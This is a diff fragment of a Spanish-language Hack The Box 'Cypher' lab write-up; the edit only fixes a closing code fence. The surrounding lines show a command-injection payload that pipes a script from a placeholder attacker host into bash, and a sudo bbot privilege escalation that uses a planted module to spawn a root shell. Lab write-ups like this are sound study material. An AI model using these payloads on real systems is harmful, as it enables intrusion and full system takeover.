@@ -43,7 +43,8 @@ CALL custom.getUrlStatusCode("cypher.htb; curl http://<ATTACKER>/shell | bash; "
 # root con bbot
 printf 'modules:\n  - ExploitModule\nmodule_dirs:\n  - /dev/shm/\n' > /dev/shm/p.yml
 echo 'import os; os.system("bash")' > /dev/shm/ExploitModule.py
-sudo bbot -p /dev/shm/p.yml```
+sudo bbot -p /dev/shm/p.yml
+```
 
 ## Movimiento lateral
 
